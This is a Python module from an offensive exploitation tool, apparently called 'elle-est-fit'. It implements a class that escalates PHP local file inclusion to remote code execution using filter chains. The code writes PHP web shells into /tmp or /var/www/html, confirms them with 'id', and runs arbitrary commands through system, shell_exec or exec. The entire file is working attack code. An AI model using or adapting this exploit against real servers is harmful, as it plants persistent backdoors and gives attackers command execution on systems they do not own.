import base64
import logging
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Dict

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase
from ..payloads.filter_chain import generate_filter_chain

logger = logging.getLogger("elle-est-fit")


class PHPFilterTechnique(TechniqueBase):
    """
    Exploit LFI using the PHP filter chain technique.
    
    This technique uses PHP's filter functionality to chain multiple filters
    together and generate arbitrary code that will be executed by the PHP engine.
    """
    
    name = "php_filters"
    description = "LFI to RCE via PHP filter chain"
    
    def __init__(self, **kwargs):
        """Initialize the PHP filter technique."""
        super().__init__(**kwargs)
        self.wrapper_path = "php://temp"  # Default resource to use
        self.shell_token = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
        self.verbose = kwargs.get('verbose', False)

    
    def exploit(self) -> bool:
        """
        Exploit the LFI using PHP filters to achieve RCE.
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("Exploiting using PHP filter technique")
        
        # Try different methods to write files
        methods = self._get_exploitation_methods()
        
        for method_name, method_payload in methods.items():
            try:
                logger.info(f"Trying method: {method_name}")
                
                # Generate the filter chain for this payload
                filter_chain = generate_filter_chain(method_payload)
                
                if self.verbose:
                    logger.debug(f"Using filter chain: {filter_chain[:100]}...")
                
                # Execute the payload
                result = self.leak_function(filter_chain)
                
                if self.verbose:
                    logger.debug(f"Response preview: {result[:200]}...")
                
                # Check if shell was created
                if "SHELL_CREATED:" in result:
                    # Extract the shell path
                    match = re.search(r"SHELL_CREATED:(.*)", result)
                    if match:
                        self.shell_path = match.group(1).strip()
                        logger.info(f"Shell created at {self.shell_path}")
                        
                        # Verify shell exists and is executable
                        if self._verify_shell():
                            return True
                        else:
                            logger.warning("Shell was created but doesn't appear to be executable")
                            continue
            except Exception as e:
                logger.debug(f"Error during {method_name} method: {str(e)}")
                continue
        
        logger.error("Failed to create shell via PHP filter technique")
        return False
    
    def _get_exploitation_methods(self) -> Dict[str, str]:
        """
        Get different methods to try for exploitation.
        
        Returns:
            Dictionary of method names and corresponding payloads
        """
        shell_token = self.shell_token
        php_code = self.php_code
        
        return {
            "file_put_contents_tmp": f"""<?php
            $shell_code = '<?php {php_code} ?>';
            $shell_path = '/tmp/shell_{shell_token}.php';
            if(file_put_contents($shell_path, $shell_code)) {{
                echo "SHELL_CREATED:$shell_path";
            }} else {{
                echo "FAILED_TO_CREATE_SHELL";
            }}
            ?>""",
            
            "file_put_contents_var_www": f"""<?php
            $shell_code = '<?php {php_code} ?>';
            $shell_path = '/var/www/html/shell_{shell_token}.php';
            if(file_put_contents($shell_path, $shell_code)) {{
                echo "SHELL_CREATED:$shell_path";
            }} else {{
                echo "FAILED_TO_CREATE_SHELL";
            }}
            ?>""",
            
            "fopen_fwrite": f"""<?php
            $shell_code = '<?php {php_code} ?>';
            $shell_path = '/tmp/shell_{shell_token}.php';
            $f = fopen($shell_path, 'w');
            if($f) {{
                fwrite($f, $shell_code);
                fclose($f);
                echo "SHELL_CREATED:$shell_path";
            }} else {{
                echo "FAILED_TO_CREATE_SHELL";
            }}
            ?>"""
        }
    
    def _verify_shell(self) -> bool:
        """
        Verify that the shell exists and is executable.
        
        Returns:
            True if the shell is working, False otherwise
        """
        try:
            # Try a simple 'id' command to verify the shell works
            output = self.execute("id")
            if output and "uid=" in output:
                logger.info("Shell verification successful")
                return True
            else:
                logger.warning("Shell verification failed, output doesn't contain expected content")
                return False
        except Exception as e:
            logger.warning(f"Shell verification failed: {str(e)}")
            return False
    
    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")
        
        # Encode the command
        encoded_command = urllib.parse.quote(command)
        
        # Try different methods to execute commands
        methods = [
            # Method 1: Using include with cmd parameter
            f"""<?php
            $output = '';
            if (file_exists('{self.shell_path}')) {{
                ob_start();
                include '{self.shell_path}';
                $output = ob_get_clean();
            }} else {{
                $output = 'Shell file not found at {self.shell_path}';
            }}
            echo "CMD_OUTPUT_START\\n" . $output . "\\nCMD_OUTPUT_END";
            ?>""",
            
            # Method 2: Direct system call with output capture
            f"""<?php
            $output = '';
            if (function_exists('system')) {{
                ob_start();
                system('{command}');
                $output = ob_get_clean();
            }} else if (function_exists('shell_exec')) {{
                $output = shell_exec('{command}');
            }} else if (function_exists('exec')) {{
                exec('{command}', $output_array);
                $output = implode("\\n", $output_array);
            }}
            echo "CMD_OUTPUT_START\\n" . $output . "\\nCMD_OUTPUT_END";
            ?>"""
        ]
        
        for method in methods:
            try:
                # Generate the filter chain for this payload
                filter_chain = generate_filter_chain(method)
                
                # Execute the payload
                result = self.leak_function(filter_chain + f"&cmd={encoded_command}")
                
                # Extract the command output
                match = re.search(r"CMD_OUTPUT_START\n(.*?)\nCMD_OUTPUT_END", result, re.DOTALL)
                if match:
                    return match.group(1)
            except Exception as e:
                logger.debug(f"Error during command execution: {str(e)}")
                continue
        
        raise ExecutionError("Failed to execute command or parse output")